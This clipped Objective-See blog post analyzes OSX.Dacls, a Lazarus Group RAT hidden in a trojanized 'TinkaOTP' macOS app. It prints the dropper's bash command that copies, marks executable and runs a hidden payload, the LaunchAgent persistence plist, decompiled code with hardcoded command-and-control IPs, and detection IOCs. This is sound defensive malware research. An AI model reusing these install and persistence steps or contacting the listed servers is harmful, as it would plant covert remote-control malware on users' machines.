---
title: Objective-See's Blog
source: https://objective-see.org/blog/blog_0x57.html
source_host: objective-see.org
clip_date: 2026-09-14T10:21:19+08:00
trace_id: c05723cf-20c7-44c7-9f11-012023358cde
content_hash: 0f32f5538405a0583509eadf896b94a33331bfcc41b9892532a88a7b254ca111
status: synced
tags:
  - 恶意样本
  - macOS安全
series: null
feed_source: Objective-See·macOS
ai_summary: Objective-See 分析确认 `TinkaOTP.dmg` 中的木马是 Lazarus 组织 `Dacls` RAT 的首个 macOS 变种，并给出其安装、持久化与检测要点。
ai_summary_style: key-points
images_status:
  total: 19
  succeeded: 19
  failed_urls: []
notion_page_id: 3db75244-d011-812a-965a-c4942927c905
ioc:
  cves:
    - CVE-2019-3396
  cwes: []
  hashes:
    - "0000000000000000000000000000000000000000"
    - 08dd7e9fb1551c8d893fac2193d8c4969a9bc08d4b7b79c4870263abaae8917d
    - 4f3367208a1a6eebc890d020eeffb9ebf43138f2
    - 4f3367208a1a6eebc890d020eeffb9ebf43138f298580293df2851eb0c6be1aa
    - 846d8647d27a0d729df40b13a644f3bffdc95f6d0e600f2195c85628d59f1dc6
    - 899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53
    - 8bd4b789e325649bafcc23f70bae0d1b915b67dc
    - d2e8bbc6db07e2c468674f829a3991d72aa196fd
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Objective-See 分析确认 `TinkaOTP.dmg` 中的木马是 Lazarus 组织 `Dacls` RAT 的首个 macOS 变种，并给出其安装、持久化与检测要点。
> 
> - **初始载荷：** 攻击者用 `TinkaOTP.dmg` 投递伪装成 OTP 应用的 `TinkaOTP.app`，仅 adhoc 签名（TeamIdentifier 未设置），靠社工诱导用户手动运行。
> - **安装逻辑：** Swift 编写的 app 经 `NSTask` 调用 `/bin/bash -c`，把 `Contents/Resources/Base.lproj/SubMenu.nib` 复制为隐藏文件 `~/Library/.mina`，再 `chmod +x` 并执行。
> - **持久化：** `.mina` 用 `fopen` 写 `~/Library/LaunchAgents/com.aex-loop.agent.plist`（root 权限时写 `/Library/LaunchDaemons/...`），`RunAtLoad=true` 实现开机自启；因默认无 `LaunchAgents` 目录，作者留了 bug 导致持久化常失败。
> - **C2 与配置：** 配置存于 `/Library/Caches/com.apple.appstore.db`，AES-CBC 加解密，缺省则生成默认配置，内置 C2 `67.43.239.146:443`、`185.62.58.207:443`，配置偏移 0x8 可读出构建日期 2020-03-24。
> - **能力与检测：** 支持命令执行、文件读写删传、进程管理、网络扫描及插件架构；可查上述 plist、`.db`、`.mina` 四个文件落盘，或用 BlockBlock/LuLu/KnockKnock 检测，确认感染建议重装系统。

The Dacls RAT...now on macOS!

deconstructing the mac variant of a lazarus group implant.

Our research, tools, and writing, are supported by the "Friends of Objective-See" such as:  

 [![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5699ae26ff433883.png) CleanMyMac X](https://macpaw.com/cleanmymac)

|     |     |
| :---: | :---: |
| [![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cf6f8658e14f0315.png) Malwarebytes](https://malwarebytes.com/?objective-see) | [![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2b098be083e61d03.png) Airo AV](https://www.airoav.com/) |

[Become a Friend!](https://objective-see.com/friends.html)

📝 👾 Want to play along?

I’ve added the [sample](https://objective-see.com/downloads/malware/Dacls.zip) (‘OSX.Dacls’) to our malware collection (password: infect3d)

…please don’t infect yourself!

### Background

Early today, the noted Mac Security researcher [Phil Stokes](https://twitter.com/philofishal) tweeted about a “ *Suspected #Lazarus backdoor/RAT* ”:

> 1\. 899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53  
> 2\. 846d8647d27a0d729df40b13a644f3bffdc95f6d0e600f2195c85628d59f1dc6
> 
> — Phil Stokes ⫍🐠⫎ (@philofishal) [May 5, 2020](https://twitter.com/philofishal/status/1257678141801332736?ref_src=twsrc%5Etfw)

In his tweet he noted various details about the malware and was kind enough to post hashes as well. Mahalo Phil (and [Thomas Reed](https://twitter.com/thomasareed/), who initially noticed the sample on VirusTotal)! 🙏

As noted in his tweet, current detections for both the [malware’s disk image](https://www.virustotal.com/gui/file/899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53/detection) and [payload](https://www.virustotal.com/gui/file/846d8647d27a0d729df40b13a644f3bffdc95f6d0e600f2195c85628d59f1dc6/detection) are at 0% (though this is likely to change as AV engines update the signature databases):

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/565d128f0d18171e.png)

  
  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bafcadcce3d1050c.png)

The Lazarus APT group (North Korea) is arguably to most prevalent (or perhaps just visible) APT group in the macOS space. In fact the majority of my recent macOS malware blogs have been about their creations:

-   “ [OSX.Yort](https://objective-see.com/blog/blog_0x53.html#osx-yort) ”
    
-   “ [Pass the AppleJeus](https://objective-see.com/blog/blog_0x49.html) ”
    
-   “ [Lazarus Group Goes ‘Fileless’](https://objective-see.com/blog/blog_0x51.html) ”
    

Though not remarkably sophisticated, they continue to evolve and improve their tradecraft.

📝 For more details on the Lazarus APT group, and their recent advancements, see  
  

["North Korean hackers getting more careful, targeted in financial hacks"](https://www.cyberscoop.com/kaspersky-lazarus-group-north-korean-hackers-targeted-financial/)

In this blog post, we deconstruct the their macOS latest creation (a variant of the `Dacls` RAT), highlighting its install logic, persistence mechanism, and capabilities! We’ll also highlights IOCs and generic methods of detection.

### Installation

Currently (at least to me), it is unknown how the Lazarus actors remotely infect macOS systems with this specimen (`OSX.Dacls`). However as our analysis will show, the way the malware is packaged closely mimics Lazarus group’s other attacks …which relied on social engineering efforts. Specifically, coercing macOS users to download and run trojanized applications:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1efc969439e0a3be.png)

Thanks to Phil’s tweet and hashes, we can find a copy of the attackers’ Apple Disk Image (`TinkaOTP.dmg`) on [VirusTotal](https://www.virustotal.com/gui/file/899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53/).

To extract the embedded files stored on the `TinkaOTP.dmg` we mount it via the `hdiutil` command:

```
$ hdiutil attach TinkaOTP.dmg 
/dev/disk3            GUID_partition_scheme           
/dev/disk3s1          Apple_HFS                       /Volumes/TinkaOTP
```

…which mounts it to `/Volumes/TinkaOTP`.

Listing the files in the `TinkaOTP` directory reveals an application (`TinkaOTP.app`) and an (uninteresting) `.DS_Store` file:

```
$ ls -lart /Volumes/TinkaOTP/

drwxr-xr-x  3 patrick  staff   102 Apr  1 16:11 TinkaOTP.app
-rw-r--r--@ 1 patrick  staff  6148 Apr  1 16:15 .DS_Store
```

Both appear to have a creation timestamp of April 1st.

The application, `TinkaOTP.app` is signed “adhoc-ly” (as the Lazarus group often does):

```swift
$ codesign -dvvv /Volumes/TinkaOTP/TinkaOTP.app 
Executable=/Volumes/TinkaOTP/TinkaOTP.app/Contents/MacOS/TinkaOTP
Identifier=com.TinkaOTP
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20100 size=5629 flags=0x2(adhoc) hashes=169+5 location=embedded
Hash type=sha256 size=32
CandidateCDHash sha1=8bd4b789e325649bafcc23f70bae0d1b915b67dc
CandidateCDHashFull sha1=8bd4b789e325649bafcc23f70bae0d1b915b67dc
CandidateCDHash sha256=4f3367208a1a6eebc890d020eeffb9ebf43138f2
CandidateCDHashFull sha256=4f3367208a1a6eebc890d020eeffb9ebf43138f298580293df2851eb0c6be1aa
Hash choices=sha1,sha256
CMSDigest=08dd7e9fb1551c8d893fac2193d8c4969a9bc08d4b7b79c4870263abaae8917d
CMSDigestType=2
CDHash=4f3367208a1a6eebc890d020eeffb9ebf43138f2
Signature=adhoc
Info.plist entries=24
TeamIdentifier=not set
Sealed Resources version=2 rules=13 files=15
Internal requirements count=0 size=12
```

This also means that on modern versions of macOS (unless some exploit is first used to gain code execution on the target system), the application will not (easily) run:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1c0eda00af48cc1d.png)

📝 Jumping a bit ahead of ourselves, a report on the Windows/Linux version of this malware noted that it was uncovered along with a "working payload for Confluence CVE-2019-3396" and that researchers, "speculated that the Lazarus Group used the CVE-2019-3396 N-day vulnerability to spread the Dacls Bot program."

…so, it is conceivable that macOS users were targeted by this (or similar) exploits.

Source: [Dacls, the Dual platform RAT](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/).

`TinkaOTP.app` is a standard macOS application:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/006ddf8b9cd4808c.png)

Examining its `Info.plist` file, illustrates that application’s binary (as specified in the `CFBundleExecutable` key), is (unsurprisingly) named `TinkaOTP`:

```swift
$ defaults read /Volumes/TinkaOTP/TinkaOTP.app/Contents/Info.plist 
{
    BuildMachineOSBuild = 19E266;
    CFBundleDevelopmentRegion = en;
    CFBundleExecutable = TinkaOTP;
    CFBundleIconFile = AppIcon;
    CFBundleIconName = AppIcon;
    CFBundleIdentifier = "com.TinkaOTP";
    CFBundleInfoDictionaryVersion = "6.0";
    CFBundleName = TinkaOTP;
    CFBundlePackageType = APPL;
    CFBundleShortVersionString = "1.2.1";
    CFBundleSupportedPlatforms =     (
        MacOSX
    );
    CFBundleVersion = 1;
    DTCompiler = "com.apple.compilers.llvm.clang.1_0";
    DTPlatformBuild = 11B52;
    DTPlatformVersion = GM;
    DTSDKBuild = 19B81;
    DTSDKName = "macosx10.15";
    DTXcode = 1120;
    DTXcodeBuild = 11B52;
    LSMinimumSystemVersion = "10.10";
    LSUIElement = 1;
    NSHumanReadableCopyright = "Copyright \\U00a9 2020 TinkaOTP. All rights reserved.";
    NSMainNibFile = MainMenu;
    NSPrincipalClass = NSApplication;
}
```

As the value for the `LSMinimumSystemVersion` key is set to `"10.10"` the malicious application will execute on macOS systems all the way back to `OS X Yosemite`.

Now, let’s take a closer look at the `TinkaOTP` binary (which will be executed if the user (successfully) launches the application). As expected, it’s a 64-bit Mach-O binary:

```
$ file TinkaOTP.app/Contents/MacOS/TinkaOTP 
TinkaOTP.app/Contents/MacOS/TinkaOTP: Mach-O 64-bit executable x86_64
```

Before hopping into a disassembler or debugger, I like to just run the malware is a virtual machine (VM), and observe its actions via process, file, and network. This can often shed valuable insight into the malware actions and capabilities, which in turn can guide further analysis focus.

📝 I've written several monitor tools to facilitate such analysis:  

-   [ProcessMonitor](https://objective-see.com/products/utilities.html#ProcessMonitor)
-   [FileMonitor](https://objective-see.com/products/utilities.html#FileMonitor)
-   [Netiquette](https://objective-see.com/products/netiquette.html)

Firing up these analysis tools, and running `TinkaOTP.app` quickly reveals its installation logic. Specifically the [ProcessMonitor](https://objective-see.com/products/utilities.html#ProcessMonitor) records the following:

```python
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "signing info (computed)" : {
      "signatureID" : "com.apple.cp",
      "signatureStatus" : 0,
      "signatureSigner" : "Apple",
      "signatureAuthorities" : [
        "Software Signing",
        "Apple Code Signing Certification Authority",
        "Apple Root CA"
      ]
    },
    "uid" : 501,
    "arguments" : [
      "cp",
      "/Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib",
      "/Users/user/Library/.mina"
    ],
    "ppid" : 863,
    "ancestors" : [
      863
    ],
    "path" : "/bin/cp",
    "signing info (reported)" : {
      "teamID" : "(null)",
      "csFlags" : 603996161,
      "signingID" : "com.apple.cp",
      "platformBinary" : 1,
      "cdHash" : "D2E8BBC6DB07E2C468674F829A3991D72AA196FD"
    },
    "pid" : 864
  },
  "timestamp" : "2020-05-06 00:16:52 +0000"
}

```

This output shows `bash` being spawned by `TinkaOTP.app` with the following arguments:

-   `cp`
-   `/Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib`
-   `/Users/user/Library/.mina`

…in other words, the malware is copying the `Base.lproj/SubMenu.nib` file (from the application’s `Resources` directory) to the user’s `Library` directory (as the “hidden” file: `.mina`).

The process monitor then shows `TinkaOTP.app` setting the executable bit on the `.mina` file (via `chmod +x /Users/user/Library/.mina`), before executing it:

```python
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "signing info (computed)" : {
      "signatureStatus" : -67062
    },
    "uid" : 501,
    "arguments" : [
      "/Users/user/Library/.mina"
    ],
    "ppid" : 863,
    "ancestors" : [
      863
    ],
    "path" : "/Users/user/Library/.mina",
    "signing info (reported)" : {
      "teamID" : "(null)",
      "csFlags" : 0,
      "signingID" : "(null)",
      "platformBinary" : 0,
      "cdHash" : "0000000000000000000000000000000000000000"
    },
    "pid" : 866
  },
  "timestamp" : "2020-05-06 00:16:53 +0000"
}
```

A partial sequence of these commands is hardcoded directly in the `TinkaOTP.app` ’s binary:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/71a1239fc3f55b8a.png)

Hopping into a disassembler (I use [Hopper](https://www.hopperapp.com/)), we can track down code (invoked via the `applicationDidFinishLaunching` method), responsible for executing said command:

```objective-c
;TinkaOTP.AppDelegate.applicationDidFinishLaunching(Foundation.Notification) 

r13 = *direct field offset for TinkaOTP.AppDelegate.btask : __C.NSTask;
rdx = __C.NSString(0x7361622f6e69622f, 0xe900000000000068);

...

[r15 setLaunchPath:rdx];

...

[r15 setArguments:...];

[*(var_30 + var_68) launch];
```

The decompilation is rather ugly (as `TinkaOTP.app` is written in Swift), but in short the malware is invoking the installation commands (`cp ...`) via Apple’s [`NSTask`](https://developer.apple.com/documentation/foundation/nstask) API.

We can confirm this via a debugger (`lldb`), by setting a breakpoint on the call to `[NSTask launch]` (at address `0x10001e30b`) and querying the `NSTask` object to view its launch path, and arguments:

```bash
(lldb) b 0x000000010001e30b
Breakpoint 6: where = TinkaOTP`TinkaOTP.AppDelegate.applicationDidFinishLaunching

(lldb) c
Process 899 resuming

Process 899 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 6.1

(lldb) po $rdi


(lldb) po [$rdi arguments]
(
 -c,
 cp /Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib 
 ~/Library/.mina > /dev/null 2>&1 && chmod +x ~/Library/.mina > /dev/null 2>&1 && 
 ~/Library/.mina > /dev/null 2>&1
)

(lldb) po [$rdi launchPath]
/bin/bash
```

### Persistence

We now turn our attention to `SubMenu.nib`, which was installed as `~/Library/.mina`.

It’s a standard Mach-O executable:

```
$ file TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib 
TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib: Mach-O 64-bit executable x86_64
```

As there turned out to be a bug in the code (ha!), we’re going to start our analysis in the disassembler at the malware’s `main` function. First we noted a (basic) anti-disassembly/obfuscation technique, where strings are dynamically built manually (via hex constants):

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/dc21d7e40baba526.png)

In Hopper, via `Shift+R` we can covert the hex to ascii:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6a979a57a74af023.png)

…which reveals a path: `/Library/LaunchAgents/com.aex.lop.agent.plist`

However, the malware author(s) also left this string directly embedded in the binary: ![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/127e04aa4f1e7ef3.png)

Within the disassembly of the `main` function, we also find an embedded property list: ![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9de87c8a86665c83.png)

Seems reasonable to assume that the malware will persist itself as a launch agent. And in fact, it tries to! However, if the `~/Library/LaunchAgent` directory does not exists (which it does not on default install of macOS), the persistence will fail.

Specifically, the malware invokes the `fopen` function (with the `+w` option) on `/Library/LaunchAgents/com.aex.lop.agent.plist` …which will error out if any directories in the path don’t exist.

This can be confirmed in a debugger:

```bash
$ lldb ~/Library/.mina

//break at the call to fopen()
(lldb) 0x10000b6e8
(lldb) c

Process 920 stopped
.mina`main:
->  0x10000b6e8 <+376>: callq  0x100078f66               ; symbol stub for: fopen
    0x10000b6ed <+381>: testq  %rax, %rax
    0x10000b6f0 <+384>: je     0x10000b711               ; <+417>
    0x10000b6f2 <+386>: movq   %rax, %rbx
Target 0: (.mina) stopped.


//print arg_0
// this is the path
(lldb) x/s $rdi
0x7ffeefbff870: "/Users/user/Library/LaunchAgents/com.aex-loop.agent.plist"

//step over call
(lldb) ni

//fopen() fails
(lldb) reg read $rax
rax = 0x0000000000000000
```

…I guess writing malware can be tough!:P

If we manually create the `~/Library/LaunchAgent` directory, the call to `fopen` succeeds and the malware will happily persist. Specifically, it formats the embedded property list (dynamically adding in the path to itself), which is then written out to `com.aex-loop.agent.plist`:

```html
$ lldb ~/Library/.mina

(lldb) 0x100078f72
(lldb) c

Process 930 stopped
.mina`main:
->  0x10000b704 <+404>: callq  0x100078f72               ; symbol stub for: fprintf
    0x10000b709 <+409>: movq   %rbx, %rdi
    0x10000b70c <+412>: callq  0x100078f4e               ; symbol stub for: fclose
    0x10000b711 <+417>: movq   %r12, %rdi
Target 0: (.mina) stopped.


//print arg_1
// this is the format string
(lldb) x/s $rsi
0x10007da69: "<?xml version="1.0" encoding="UTF-8"?>\r\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\r\n<plist version="1.0">\r\n<dict>\r\n\t<key>Label</key>\r\n\t<string>com.aex-loop.agent</string>\r\n\t<key>ProgramArguments</key>\r\n\t<array>\r\n\t\t<string>%s</string>\r\n\t\t<string>daemon</string>\r\n\t</array>\r\n\t<key>KeepAlive</key>\r\n\t<false/>\r\n\t<key>RunAtLoad</key>\r\n\t<true/>\r\n</dict>\r\n</plist>"

//print arg_2
// this is the format data (path to self)
(lldb) x/s $rdx
0x101000000: "/Users/user/Library/.mina"

```

Our [`FileMonitor`](https://objective-see.com/products/utilities.html#FileMonitor) passively observers this:

```python
# FileMonitor/Contents/MacOS/FileMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    "destination" : "/Users/user/Library/LaunchAgents/com.aex-loop.agent.plist",
    "process" : {
      "signing info (computed)" : {
        "signatureStatus" : -67062
      },
      "uid" : 501,
      "arguments" : [

      ],
      "ppid" : 932,
      "ancestors" : [
        932,
        909,
        905,
        904,
        820,
        1
      ],
      "path" : "/Users/user/Library/.mina",
      "signing info (reported)" : {
        "teamID" : "(null)",
        "csFlags" : 0,
        "signingID" : "(null)",
        "platformBinary" : 0,
        "cdHash" : "0000000000000000000000000000000000000000"
      },
      "pid" : 931
    }
  },
  "timestamp" : "2020-05-06 01:14:18 +0000"
}
```

As the value for the `RunAtLoad` key is set to `true` the malware will be automatically (re)started by macOS each time the system is rebooted (and the user logs in).

📝 If the malware finds itself running with root privileges it will persist to:  
  

/Library/LaunchDaemons/com.aex-loop.agent.plist

Ok, so now we understand how the malware persists, let’s briefly discuss its capabilities.

### Capabilities

So far we know that the trojanized `TinkaOTP.app` installs a binary to `~/Library/.mina`, and persists it as a launch item.

…but what does `.mina` actually do? The good news (for me as a somewhat lazy malware analyst), is that this has already be answered!

Running the `strings` command on the `.mina` binary reveals some interesting, well, strings:

```bash
$ strings -a ~/Library/.mina

c_2910.cls
k_3872.cls

http:/
POST /%s HTTP/1.0
Host: %s
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7

/Library/Caches/com.apple.appstore.db

/proc
/proc/%d/task
/proc/%d/cmdline
/proc/%d/status

wolfCrypt Operation Pending (would block / eagain) error
wolfCrypt operation not pending error

```

When analyzing an unknown malicious piece of software it’s (generally) a good idea to Google interesting strings, as this can turn up related files, or even better, previous analysis reports. Here we luck out, as the latter holds!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/acc7264da9d145ff.png)

The `c_2910.cls` string matches on a report for a Lazarus Group cross-platform RAT named `Dacls` …and as we’ll see other strings, and functionality (as well as input by other security researchers) confirm this.

The initial report on the `Dacls` RAT, was published in December 2019, by Netlab. Titled, [“Dacls, the Dual platform RAT”](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/), it comprehensively covers both the Windows and Linux variants of this RAT (as well as notes, “ *we speculate that the attacker behind Dacls RAT is Lazarus Group* ”).

…however there is no mention of a macOS variant! As such, this specimen appears to be the first macOS variant of `Dacls` (and thus also, this post, the first analysis)!

As noted, the Netlab [report](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/) provides a thorough analysis of the RATs capabilities on Windows/Linux. As such, we won’t duplicate said analysis, but instead will confirm that this specimen is indeed a macOS variant of `Dacls`, as well as note a few macOS-specific nuances/IOCs.

Looking at the disassembly of the malware’s `main` function, after the malware persists, it invokes a function named `InitializeConfiguration`:

```objective-c
int InitializeConfiguration() {
  rax = time(&var_18);
  srand(rax);
  if (LoadConfig(_g_mConfig) != 0x0) 
  {
    __bzero(_g_mConfig, 0x8e14);
    rax = rand();

    *(int32_t *)_g_mConfig = ((SAR((sign_extend_32(rax) * 0xffffffff80000081 >> 0x20) 
    + sign_extend_32(rax), 0x17)) + ((sign_extend_32(rax) * 0xffffffff80000081 >> 0x20) 
    + sign_extend_32(rax) >> 0x1f) - ((SAR((sign_extend_32(rax) * 0xffffffff80000081 >> 0x20) 
    + sign_extend_32(rax), 0x17)) + ((sign_extend_32(rax) * 0xffffffff80000081 >> 0x20) 
    + sign_extend_32(rax) >> 0x1f) << 0x18)) + sign_extend_32(rax);

    *0x10009c3c8 = 0x1343b8400030100;
    *(int32_t *)dword_10009c42c = 0x3;

    mata_wcscpy(0x10009c430, u"67.43.239.146:443");
    mata_wcscpy(0x10009cc30, u"185.62.58.207:443");
    mata_wcscpy(0x10009d430, u"185.62.58.207:443");
    *(int32_t *)0x10009c3d0 = 0x2;
    rax = SaveConfig(_g_mConfig);

  }
  else {
          rax = 0x0;
  }
  return rax;
}
```

After seeding the random number generator, the malware invokes a function named `LoadConfig`. In short, the `LoadConfig` function attempts to load a configuration file from `/Library/Caches/com.apple.appstore.db`. If found, it decrypts the configuration via a call to the `AES_CBC_decrypt_buffer` function. If the configuration is not found, it returns a non-zero error.

Looking at the code in `InitializeConfiguration` we can see that if `LoadConfig` fails (i.e. no configuration file is found), code within `InitializeConfiguration` will generate a default configuration, which is then saved via a call to the `SaveConfig` function.

We can see three IP addresses (two unique) that are part of the default configuration: `67.43.239.146` and `185.62.58.207`. These as the default command & control servers.

Returning to the Netlab [report](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/), it states:

> “ *The Linux.Dacls Bot configuration file is stored at $HOME/.memcache, and the file content is 0x8E20 + 4 bytes. If Bot cannot find the configuration file after startup, it will use AES encryption to generate the default configuration file based on the hard-coded information in the sample. After successful Bot communicates with C2, the configuration file will get updated.*”

It appears the macOS variant of `Dacls` contains this same logic (albiet the config file is stored in `/Library/Caches/com.apple.appstore.db`).

The Netlab researchers also breakdown the format of the configuration file (image credit: Netlab):

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7d779d1cf8006ce8.png)

Does our macOS variant conform to this format? Yes it appears so:

```yaml
(lldb) x/i $pc
->  0x100004c4c: callq  0x100004e20 ; SaveConfig(tagMATA_CONFIG*)

(lldb) x/192xb $rdi
0x10009c3c4: 0xcc 0x37 0x86 0x00 0x00 0x01 0x03 0x00
0x10009c3cc: 0x84 0x3b 0x34 0x01 0x02 0x00 0x00 0x00
0x10009c3d4: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3dc: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3e4: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3ec: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3f4: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3fc: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c404: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c40c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c414: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c41c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c424: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c42c: 0x03 0x00 0x00 0x00 0x36 0x00 0x37 0x00
0x10009c434: 0x2e 0x00 0x34 0x00 0x33 0x00 0x2e 0x00
0x10009c43c: 0x32 0x00 0x33 0x00 0x39 0x00 0x2e 0x00
0x10009c444: 0x31 0x00 0x34 0x00 0x36 0x00 0x3a 0x00
0x10009c44c: 0x34 0x00 0x34 0x00 0x33 0x00 0x00 0x00
0x10009c454: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c45c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c464: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c46c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c474: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c47c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00

```

This means we can also extract the (build?) date from the default configuration (offset 0x8): `0x84 0x3b 0x34 0x01` …which converts to 0x01343b84 -> 20200324d (March 24th, 2020).

The Netlab [report](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/) also highlights the fact that `Dacls` utilizes a modular plugin architecture:

> “ *\[Dacls\] uses static compilation to compile the plug-in and Bot code together. By sending different instructions to call different plug-ins, various tasks can be completed.*”

…the report describes various plugins such as a file plugin, a process plugin, a test plugin, a “reverse P2P” plugin, and a “LogSend” plugin. The macOS variant of `Dacls` supports these plugins (and perhaps an addition one or two, i.e. SOCKS):

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a81665703a1b1960.png)

At this point, we can readily conclude that the specimen we’re analyzing is clearly a macOS variant of the `Dacls` implant. Preliminary analysis and similarity to the Linux variant indicates this affords remote attackers the ability to fully control an infected system, and the implant supports the ability to:

-   execute system commands
-   upload/download, read/write, delete files
-   listing, creating, terminating processes
-   network scanning

> “ *The main functions of …Dacls Bot include: command execution, file management, process management, test network access, C2 connection agent, network scanning module.*” -Netlab

### Detection

Though `OSX.Dacls` is rather feature complete, it is trivial to detect via behavior-based tools …such as the [free ones](https://objective-see.com/products.html), created by yours truly!

For example, [BlockBlock](https://objective-see.com/products/blockblock.html) readily detects the malware’s launch item persistence:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4de775236a0c99f8.png)

While [LuLu](https://objective-see.com/products/lulu.html) detects the malware’s unauthorized network communications to the attackers’ remote command & control server:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/45133ed30bcdca85.png)

Finally, [KnockKnock](https://objective-see.com/products/knockknock.html) can generically detect if a macOS system is infected with `OSX.Dacls`, by detecting it’s launch item persistence:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/335a47641717704d.png)

To manually detect `OSX.Dacls` look for the presence of the following files:

-   `~/Library/LaunchAgents/com.aex.lop.agent.plist`
-   `/Library/LaunchDaemons/com.aex.lop.agent.plist`
-   `/Library/Caches/com.apple.appstore.db`
-   `~/Library/.mina`

If you system is infected, as the malware provide complete command and control over an infected system, best to assume your 100% owned, and fully reinstall macOS!

### Conclusion

Today, we analyzed the macOS variant of `OSX.Dacls`, highlighting its installation logic, persistence mechanisms, and capabilities (noting the clear similarities to its Linux-version).

Though it can be somewhat worrisome to see APT groups developing and evolving their macOS capabilities, our [free](https://objective-see.com/products.html) security tools can help thwart these threats …even with no a priori knowledge! 🛠️ 😇

  

❤️ Love these blog posts and/or want to support my research and tools?

You can support them via my [Patreon](https://www.patreon.com/bePatron?c=701171) page!
